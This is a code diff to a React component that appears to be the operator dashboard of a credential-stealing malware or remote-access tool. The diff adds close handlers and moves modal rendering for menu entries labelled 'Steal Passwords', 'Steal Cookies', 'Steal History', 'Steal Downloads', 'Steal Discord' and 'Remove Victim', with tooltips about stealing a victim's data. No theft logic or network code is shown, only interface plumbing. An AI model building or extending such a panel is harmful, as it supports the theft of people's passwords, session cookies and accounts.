@@ -84,7 +84,7 @@ export default function Component() {
 
   const userInfo = {
     name: "Faccin",
-    registeredDate: "2023-01-15",
+    registeredDate: "2024-01-15",
     expiryDate: "2038-01-15",
   };
   const rota = useRouter();
@@ -358,18 +358,33 @@ export default function Component() {
     const handleOpenDiscord = () => {
       setIsDiscordOpen(true);
     };
+    const handleCloseDiscord = () => {
+      setIsDiscordOpen(false);
+    };
     const handleOpenDL = () => {
       setIsDownloadsOpen(true);
+    };
+    const handleCloseDL = () => {
+      setIsDownloadsOpen(false);
     };
 
     const handleOpenHistory = () => {
       setIsHistoryOpen(true);
     };
+    const handleCloseHistory = () => {
+      setIsHistoryOpen(false);
+    };
     const handleOpenCookies = () => {
       setIsCookiesOpen(true);
     };
+    const handleCloseCookies = () => {
+      setIsCookiesOpen(false);
+    };
     const handleOpenModalSenha = () => {
       setIsModalOpenSenha(true);
+    };
+    const handleCloseModalSenha = () => {
+      setIsModalOpenSenha(false);
     };
 
     return (
@@ -418,58 +433,28 @@ export default function Component() {
                   className="no-underline"
                   title="Here you can steal the user Passwords"
                 >
-                  <button
-                    className=" text-white font-normal px-4 py-2 rounded"
-                    onClick={handleOpenModalSenha}
-                  >
-                    <p>Steal Passwords</p>
-                  </button>
-                  <div>{isModalOpenSenha && <ModalPassowrds />}</div>
+                    <p  onClick={handleOpenModalSenha}>Steal Passwords</p>
                 </abbr>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Cookies">
-                  <button
-                    className=" text-white font-normal px-4 py-2 rounded"
-                    onClick={handleOpenCookies}
-                  >
-                    <p>Steal Cookies</p>
-                  </button>
+                    <p  onClick={handleOpenCookies}>Steal Cookies</p>
                 </abbr>
-                <div>{isCookiesOpen && <ModalCookies />}</div>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin History">
-                  <button
-                    className=" text-white font-normal px-4 py-2 rounded"
-                    onClick={handleOpenHistory}
-                  >
-                    <p>Steal History</p>
-                  </button>
+                    <p onClick={handleOpenHistory}>Steal History</p>
                 </abbr>
-                <div>{isHistoryOpen && <ModalHistory />}</div>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Downloads">
-                  <button
-                    className=" text-white font-normal px-4 py-2 rounded"
-                    onClick={handleOpenDL}
-                  >
-                    <p> Steal Downloads</p>
-                  </button>
+                    <p onClick={handleOpenDL}> Steal Downloads</p>
                 </abbr>
-                <div>{isDownloadsOpen && <ModalDownloads />}</div>
               </div>
               <div className="px-4 py-2 hover:bg-zinc-700 cursor-pointer">
                 <abbr title="Here you can steal the victmin Discord">
-                  <button
-                    className=" text-white font-normal px-4 py-2 rounded"
-                    onClick={handleOpenDiscord}
-                  >
-                    <p>Steal Discord</p>
-                  </button>
+                    <p onClick={handleOpenDiscord}>Steal Discord</p>
                 </abbr>
-                <div>{isDiscordOpen && <ModalDiscord />}</div>
               </div>
             </div>
           )}
@@ -478,9 +463,17 @@ export default function Component() {
         <div className="px-4 py-2 hover:bg-zinc-700 text-red-500 cursor-pointer">
           <button>Remove Victim</button>
         </div>
+        {isHistoryOpen && <ModalHistory />}
+        {isDownloadsOpen && <ModalDownloads />}
+        {isDiscordOpen && <ModalDiscord/>}
+        {isCookiesOpen && <ModalCookies/>}
+        {isModalOpenSenha && <ModalPassowrds />}
       </div>
+      
     );
+    
   }
+  
 
   return (
     <HereBackgroundGradientAnimation>
